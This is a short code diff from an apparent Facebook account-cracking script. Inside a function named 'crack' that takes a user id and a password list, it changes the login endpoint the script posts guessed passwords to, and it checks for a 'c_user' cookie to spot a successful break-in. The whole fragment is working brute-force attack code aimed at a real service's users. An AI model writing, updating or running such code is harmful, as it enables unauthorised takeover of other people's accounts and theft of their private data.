@@ -234,7 +234,7 @@ def crack(uid, password_list, total_count):
             'ab_test_data': '/AAAAAAA/AA/AAAAA/AAAA/AAAAAAAAAAAAAAAA/AAA/AfffffDFAA',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
             }
-            respon = Session.post('https://www.facebook.com/login/device-based/regular/login/',params=params,cookies=cookies,headers=headers,data=data)
+            respon = Session.post('https://web.facebook.com/login/device-based/regular/login/',params=params,cookies=cookies,headers=headers,data=data)
             log_cookies = Session.cookies.get_dict().keys()
             # Check response
             if "c_user" in log_cookies:
